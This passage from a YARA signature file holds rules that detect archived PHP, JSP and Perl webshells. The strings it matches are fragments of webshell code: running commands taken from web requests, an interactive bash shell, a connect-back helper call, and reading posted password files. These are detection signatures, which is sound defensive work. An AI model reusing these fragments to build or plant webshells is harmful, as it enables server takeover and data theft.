		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<p>More: <a href=\"/\">Md5Cracking.Com Crew</a> " fullword
		$s7 = "href=\"/\" title=\"Securityhouse\">Security House - Shell Center - Edited By Kin"
		$s9 = "echo '<PRE><P>This is exploit from <a " fullword
		$s10 = "This Exploit Was Edited By KingDefacer" fullword
		$s13 = "safe_mode and open_basedir Bypass PHP 5.2.9 " fullword
		$s14 = "$hardstyle = explode(\"/\", $file); " fullword
		$s20 = "while($level--) chdir(\"..\"); " fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_STNC_Webshell_V0_8 {
    meta:
		description = "PHP Webshells Github Archive - file STNC WebShell v0.8.php"
		author = "Florian Roth (Nextron Systems)"
		id = "5dc300a2-9965-52e3-a382-b8d327eb7029"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6312-L6325"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "52068c9dff65f1caae8f4c60d0225708612bb8bc"
		logic_hash = "c2067a1b78c441aa05366b612090e0df895c621843038cc9e65beb6719c0cb9a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "if(isset($_POST[\"action\"])) $action = $_POST[\"action\"];" fullword
		$s8 = "elseif(fe(\"system\")){ob_start();system($s);$r=ob_get_contents();ob_end_clean()"
		$s13 = "{ $pwd = $_POST[\"pwd\"]; $type = filetype($pwd); if($type === \"dir\")chdir($pw"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Php_Webshells_Tryag {
    meta:
		description = "PHP Webshells Github Archive - file tryag.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6326-L6341"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "42d837e9ab764e95ed11b8bd6c29699d13fe4c41"
		logic_hash = "2af3bbe8d1940e60843f3f5d40c9c6550e76df21568c374f7a871f73aeefae44"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<title>TrYaG Team - TrYaG.php - Edited By KingDefacer</title>" fullword
		$s3 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\"; " fullword
		$s6 = "$string = !empty($_POST['string']) ? $_POST['string'] : 0; " fullword
		$s7 = "$tabledump .= \"CREATE TABLE $table (\\n\"; " fullword
		$s14 = "echo \"<center><div id=logostrip>Edit file: $editfile </div><form action='$REQUE"

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_Dc3_Security_Crew_Shell_Priv_2 {
    meta:
		description = "PHP Webshells Github Archive - file dC3 Security Crew Shell PRiV.php"
		author = "Florian Roth (Nextron Systems)"
		id = "1d4a95c4-8128-504d-958f-dcc5c68f4975"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6342-L6357"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "9077eb05f4ce19c31c93c2421430dd3068a37f17"
		logic_hash = "52dc0449c205ff9105e2dedc3cb4858f83a2efc7bae579656a26da493dc59500"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");" fullword
		$s9 = "header(\"Last-Modified: \".date(\"r\",filemtime(__FILE__)));" fullword
		$s13 = "header(\"Content-type: image/gif\");" fullword
		$s14 = "@copy($file,$to) or die (\"[-]Error copying file!\");" fullword
		$s20 = "if (isset($_GET['rename_all'])) {" fullword

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_Qsd_Php_Backdoor {
    meta:
		description = "PHP Webshells Github Archive - file qsd-php-backdoor.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f8208851-159c-5d0b-91ad-478aeb4fc9fd"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6358-L6372"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "4856bce45fc5b3f938d8125f7cdd35a8bbae380f"
		logic_hash = "3ef7b67cd60370a99fdfa6fd614f71ee314af27c9d983383dde8f03a127a28b3"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "// A robust backdoor script made by Daniel Berliner - http://www.qsdconsulting.c"
		$s2 = "if(isset($_POST[\"newcontent\"]))" fullword
		$s3 = "foreach($parts as $val)//Assemble the path back together" fullword
		$s7 = "$_POST[\"newcontent\"]=urldecode(base64_decode($_POST[\"newcontent\"]));" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Php_Webshells_Spygrup {
    meta:
		description = "PHP Webshells Github Archive - file spygrup.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6373-L6387"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "12f9105332f5dc5d6360a26706cd79afa07fe004"
		logic_hash = "5981f8cc1a98f799b1573cf73297383f995acf1c40f0227ac10302dc4d6fd6cc"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "kingdefacer@msn.com</FONT></CENTER></B>\");" fullword
		$s6 = "if($_POST['root']) $root = $_POST['root'];" fullword
		$s12 = "\".htmlspecialchars($file).\" Bu Dosya zaten Goruntuleniyor<kingdefacer@msn.com>" fullword
		$s18 = "By KingDefacer From Spygrup.org>" fullword

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_Web_Shell__C_Shankar {
    meta:
		description = "PHP Webshells Github Archive - file Web-shell (c)ShAnKaR.php"
		author = "Florian Roth (Nextron Systems)"
		id = "966f5580-21c5-5ecf-b500-bde3d1ba4494"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6388-L6402"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3dd4f25bd132beb59d2ae0c813373c9ea20e1b7a"
		logic_hash = "9d320eed18a5d76a87cee4ea0fa9caf08f096f7eeaab55420540aa082b596e0f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "header(\"Content-Length: \".filesize($_POST['downf']));" fullword
		$s5 = "if($_POST['save']==0){echo \"<textarea cols=70 rows=10>\".htmlspecialchars($dump"
		$s6 = "write(\"#\\n#Server : \".getenv('SERVER_NAME').\"" fullword
		$s12 = "foreach(@file($_POST['passwd']) as $fed)echo $fed;" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Ayyildiz_Tim___AYT__Shell_V_2_1_Biz {
    meta:
		description = "PHP Webshells Github Archive - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.php"
		author = "Florian Roth (Nextron Systems)"
		id = "fdd9bae9-80f3-5200-b922-e7d194009af8"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6403-L6417"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5fe8c1d01dc5bc70372a8a04410faf8fcde3cb68"
		logic_hash = "2d096baad162c0e3e01732007a3be2804155e614a8fa4cd2d5dd3a7ac808fb49"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "<meta name=\"Copyright\" content=TouCh By iJOo\">" fullword
		$s11 = "directory... Trust me - it works :-) */" fullword
		$s15 = "/* ls looks much better with ' -F', IMHO. */" fullword
		$s16 = "} else if ($command == 'ls') {" fullword

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_Gamma_Web_Shell {
    meta:
		description = "PHP Webshells Github Archive - file Gamma Web Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "43b4fc9f-8897-5553-8846-29d307efa885"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6418-L6432"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "7ef773df7a2f221468cc8f7683e1ace6b1e8139a"
		logic_hash = "1de868c4948a95272d288aeba3ac38b84bf6b33ede6b3b600b32530c85586404"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "$ok_commands = ['ls', 'ls -l', 'pwd', 'uptime'];" fullword
		$s8 = "### Gamma Group <http://www.gammacenter.com>" fullword
		$s15 = "my $error = \"This command is not available in the restricted mode.\\n\";" fullword
		$s20 = "my $command = $self->query('command');" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Php_Webshells_Aspydrv {
    meta:
		description = "PHP Webshells Github Archive - file aspydrv.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6433-L6448"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3d8996b625025dc549d73cdb3e5fa678ab35d32a"
		logic_hash = "314fd671b163b9904cc78cb3a5858f5b1e3dfae9d520d5ebc545a7abd922e9f7"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files"
		$s1 = "nPos = InstrB(nPosEnd, biData, CByteString(\"Content-Type:\"))" fullword
		$s3 = "Document.frmSQL.mPage.value = Document.frmSQL.mPage.value - 1" fullword
		$s17 = "If request.querystring(\"getDRVs\")=\"@\" then" fullword
		$s20 = "' ---Copy Too Folder routine Start" fullword

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_Jspwebshell_1_2_2 {
    meta:
		description = "PHP Webshells Github Archive - file JspWebshell 1.2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "659f5c7d-0a9c-554d-a0ad-e3bcb8c5a1e9"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6449-L6464"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "184fc72b51d1429c44a4c8de43081e00967cf86b"
		logic_hash = "41d937fce969a850a2e4e07eb168becc96a036317a78d620e812707be9466dfc"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
		$s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java."
		$s4 = "// String tempfilepath=request.getParameter(\"filepath\");" fullword
		$s15 = "endPoint=random1.getFilePointer();" fullword
		$s20 = "if (request.getParameter(\"command\") != null) {" fullword

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_G00Nshell_V1_3 {
    meta:
		description = "PHP Webshells Github Archive - file g00nshell-v1.3.php"
		author = "Florian Roth (Nextron Systems)"
		id = "61a09576-7e62-5a30-a52c-492b81b96322"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6465-L6480"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "70fe072e120249c9e2f0a8e9019f984aea84a504"
		logic_hash = "2ecb3ce2aa43a99552fb26e610c35bdb04f4ff0dc75c867e4327d6e27eed0177"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s10 = "#To execute commands, simply include ?cmd=___ in the url. #" fullword
		$s15 = "$query = \"SHOW COLUMNS FROM \" . $_GET['table'];" fullword
		$s16 = "$uakey = \"724ea055b975621b9d679f7077257bd9\"; // MD5 encoded user-agent" fullword
		$s17 = "echo(\"<form method='GET' name='shell'>\");" fullword
		$s18 = "echo(\"<form method='post' action='?act=sql'>\");" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Winx_Shell_2 {
    meta:
		description = "PHP Webshells Github Archive - file WinX Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "ebad4f2e-96c3-5cb7-b228-de3a6a39ae55"
		date = "2023-12-05"
		modified = "2023-12-05"
		old_rule_name = "WebShell_WinX_Shell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6481-L6497"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a94d65c168344ad9fa406d219bdf60150c02010e"
		logic_hash = "f953c297763e41d197ce186dc818b656951dfa8c855c5063fc4abb54eeefc7bb"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "// It's simple shell for all Win OS." fullword
		$s5 = "//------- [netstat -an] and [ipconfig] and [tasklist] ------------" fullword
		$s6 = "<html><head><title>-:[GreenwooD]:- WinX Shell</title></head>" fullword
		$s13 = "// Created by greenwood from n57" fullword
		$s20 = " if (is_uploaded_file($userfile)) {" fullword

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_PHANTASMA {
    meta:
		description = "PHP Webshells Github Archive - file PHANTASMA.php"
		author = "Florian Roth (Nextron Systems)"
		id = "b36a7dbb-7d40-5fca-8409-c8822298005c"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6498-L6512"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "cd12d42abf854cd34ff9e93a80d464620af6d75e"
		logic_hash = "355be62807182f9a53bac20a6dead8f0a3bee83b6bdc4566502c157f16076b9b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s12 = "\"    printf(\\\"Usage: %s [Host] <port>\\\\n\\\", argv[0]);\\n\" ." fullword
		$s15 = "if ($portscan != \"\") {" fullword
		$s16 = "echo \"<br>Banner: $get <br><br>\";" fullword
		$s20 = "$dono = get_current_user( );" fullword

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_Php_Webshells_Cw {
    meta:
		description = "PHP Webshells Github Archive - file cw.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6513-L6529"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "e65e0670ef6edf0a3581be6fe5ddeeffd22014bf"
		logic_hash = "52bfb14f4d5d3df787ce7782cbbee25ea1556758eed48e3001c8a3f35a541526"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "// Dump Database [pacucci.com]" fullword
		$s2 = "$dump = \"-- Database: \".$_POST['db'] .\" \\n\";" fullword
		$s7 = "$aids = passthru(\"perl cbs.pl \".$_POST['connhost'].\" \".$_POST['connport']);" fullword
		$s8 = "<b>IP:</b> <u>\" . $_SERVER['REMOTE_ADDR'] .\"</u> - Server IP:</b> <a href='htt"
		$s14 = "$dump .= \"-- Cyber-Warrior.Org\\n\";" fullword
		$s20 = "if(isset($_POST['doedit']) && $_POST['editfile'] != $dir)" fullword

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_Php_Include_W_Shell {
    meta:
		description = "PHP Webshells Github Archive - file php-include-w-shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a80ca446-6612-51b4-99a7-8a8d8e6ee196"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6530-L6543"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1a7f4868691410830ad954360950e37c582b0292"
		logic_hash = "2be144060d4fdaee38214dc2eba80c2a6fd3699060d274e66356fd5a08c9be4b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s13 = "# dump variables (DEBUG SCRIPT) NEEDS MODIFINY FOR B64 STATUS!!" fullword
		$s17 = "\"phpshellapp\" => \"export TERM=xterm; bash -i\"," fullword
		$s19 = "else if($numhosts == 1) $strOutput .= \"On 1 host..\\n\";" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Mysql_Tool {
    meta:
		description = "PHP Webshells Github Archive - file mysql_tool.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a22a0a5c-a686-517e-b1f9-279edab0616b"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6544-L6556"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c9cf8cafcd4e65d1b57fdee5eef98f0f2de74474"
		logic_hash = "611636b3fa9a3163574b18cf8eacebea9733a1ad381261387f79a532b003e8fd"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s12 = "$dump .= \"-- Dumping data for table '$table'\\n\";" fullword
		$s20 = "$dump .= \"CREATE TABLE $table (\\n\";" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Phpspy_Ver_2006 {
    meta:
		description = "PHP Webshells Github Archive - file PhpSpy Ver 2006.php"
		author = "Florian Roth (Nextron Systems)"
		id = "adbb1963-31c8-5540-a679-c75b1101c163"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6557-L6571"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "34a89e0ab896c3518d9a474b71ee636ca595625d"
		logic_hash = "69bd2c387b0e676168116f3b3c3c081e08fd555cc6bc9a94b9c8ef97f194b09f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword
		$s12 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."
		$s19 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32"
		$s20 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe'"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Zyklonshell {
    meta:
		description = "PHP Webshells Github Archive - file ZyklonShell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4d7ff3e5-4940-52c8-b045-5db1523f70c2"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6572-L6586"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3fa7e6f3566427196ac47551392e2386a038d61c"
		logic_hash = "5d49f2599781836156f6bbb0c50cfcffdb2ca51c7cb688abbc6245d7f856ad01"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "The requested URL /Nemo/shell/zyklonshell.txt was not found on this server.<P>" fullword
		$s1 = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">" fullword
		$s2 = "<TITLE>404 Not Found</TITLE>" fullword
		$s3 = "<H1>Not Found</H1>" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Php_Webshells_Myshell_2 {
    meta:
		description = "PHP Webshells Github Archive - file myshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2023-12-05"
		modified = "2023-12-05"
		old_rule_name = "WebShell_php_webshells_myshell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6587-L6602"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5bd52749872d1083e7be076a5e65ffcde210e524"
		logic_hash = "7765e43189d6ec0cda0b58d00cfd7fc8cec89287dbac7487083b6ce1ce55f306"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "if($ok==false &&$status && $autoErrorTrap)system($command . \" 1> /tmp/outpu"
		$s5 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o"
		$s15 = "<title>$MyShellVersion - Access Denied</title>" fullword
		$s16 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTT"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Php_Webshells_Lolipop {
    meta:
		description = "PHP Webshells Github Archive - file lolipop.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6603-L6616"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "86f23baabb90c93465e6851e40104ded5a5164cb"
		logic_hash = "8b0dcf76a244f80d4bee0c62189df55c1f8d71cf0900cd8ebb5916f5fe972bed"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "$commander = $_POST['commander']; " fullword
		$s9 = "$sourcego = $_POST['sourcego']; " fullword
		$s20 = "$result = mysql_query($loli12) or die (mysql_error()); " fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Simple_Cmd {
    meta:
		description = "PHP Webshells Github Archive - file simple_cmd.php"
		author = "Florian Roth (Nextron Systems)"
		id = "1fd0c01a-c265-5e30-ab36-e8e93e316fbe"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6617-L6631"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "466a8caf03cdebe07aa16ad490e54744f82e32c2"
		logic_hash = "82a65f4bbdcd2fc626aa9f36fe530d19aa19a48389e970c26e525597818914ee"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
		$s2 = "<title>G-Security Webshell</title>" fullword
		$s4 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
		$s6 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Go_Shell {
    meta:
		description = "PHP Webshells Github Archive - file go-shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "63eaf530-050a-5db7-8885-d4a1e86d62de"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6632-L6647"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3dd85981bec33de42c04c53d081c230b5fc0e94f"
		logic_hash = "f2fcefb9a0536c80fa74ceb002e113f95de53d1f56e22c81b542c395dd11071d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "#change this password; for power security - delete this file =)" fullword
		$s2 = "if (!defined$param{cmd}){$param{cmd}=\"ls -la\"};" fullword
		$s11 = "open(FILEHANDLE, \"cd $param{dir}&&$param{cmd}|\");" fullword
		$s12 = "print << \"[kalabanga]\";" fullword
		$s13 = "<title>GO.cgi</title>" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Azrailphp_V1_0_2 {
    meta:
		description = "PHP Webshells Github Archive - file aZRaiLPhp v1.0.php"
		author = "Florian Roth (Nextron Systems)"
		id = "10546549-e16d-567d-9d88-3d37fe8ff03f"
		date = "2023-12-05"
		modified = "2023-12-05"
		old_rule_name = "WebShell_aZRaiLPhp_v1_0"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6648-L6663"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a2c609d1a8c8ba3d706d1d70bef69e63f239782b"
		logic_hash = "8309338bb327cc14ae5970bd921b3dba68353d55be31b9dbbc5374ded24ed563"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<font size='+1'color='#0000FF'>aZRaiLPhP'nin URL'si: http://$HTTP_HOST$RED"
		$s4 = "$fileperm=base_convert($_POST['fileperm'],8,10);" fullword
		$s19 = "touch (\"$path/$dismi\") or die(\"Dosya Olu" fullword
